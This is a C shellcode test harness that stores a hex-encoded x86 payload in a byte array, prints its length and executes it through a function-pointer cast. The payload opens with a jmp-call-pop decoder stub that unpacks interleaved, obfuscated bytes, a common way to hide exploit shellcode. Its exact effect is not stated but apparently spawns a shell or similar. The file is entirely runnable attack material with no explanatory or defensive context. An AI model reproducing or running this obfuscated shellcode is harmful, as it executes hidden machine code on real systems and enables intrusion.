#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x1a\x5f\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb1\x32\x8a\x14\x1f\x88\x14\x07\xfe\xc0\x80\xc3\x02\xe2\xf3\xeb\x05\xe8\xe1\xff\xff\xff\x31\xd3\xc0\x75\x50\xda\x68\x87\x2f\x3f\x2f\xe8\x73\x6a\x68\xc2\x68\xaf\x2f\x19\x62\xbf\x69\x11\x6e\xdf\x89\x2a\xe3\x90\x50\x79\x89\x2e\xe2\x05\x53\x3d\x89\x8b\xe1\x70\xb0\x92\x0b\x90\xcd\x8e\x80\x94";

void main(){
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
